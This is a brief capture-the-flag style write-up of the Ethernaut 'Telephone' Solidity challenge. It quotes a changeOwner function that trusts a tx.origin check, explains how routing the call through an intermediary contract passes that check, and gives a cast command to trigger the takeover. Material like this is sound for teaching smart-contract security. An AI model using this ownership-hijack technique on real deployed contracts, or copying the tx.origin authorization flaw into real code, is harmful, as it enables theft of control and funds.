# Telephone

```sol
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

tx.origin won't be equal to msg.sender since we're using TelephoneTakeover contract as a middle man.

```sh
cast send <TelephoneTakeover address> "takeover()"
```

"In a simple call chain A->B->C->D, inside D msg.sender will be C, and tx.origin will be A."

```
tx.origin = us
msg.sender = TelephoneTakeover contract address
```

Beautifully explained in this stackoverflow thread https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
